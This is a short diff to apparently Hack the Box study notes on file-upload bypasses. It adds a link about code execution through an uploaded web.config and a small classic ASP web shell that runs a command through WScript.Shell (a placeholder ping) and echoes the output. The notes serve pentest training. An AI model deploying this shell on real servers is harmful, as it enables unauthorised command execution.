@@ -40,3 +40,15 @@ Other extensions:
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1f085b6d-5326-4526-b792-4ead3add7bdf)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3c9f0e11-6cea-4c15-b6f3-275c1c7682a8)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a4344684-cf50-4610-8f92-1051b1325cde)
+
+RCE by uploading a `web.config` file: https://web.archive.org/web/20200808062615/https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
+
+Simple Shell:
+```CSS
+<%
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c ping CHANGE_ME")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+```
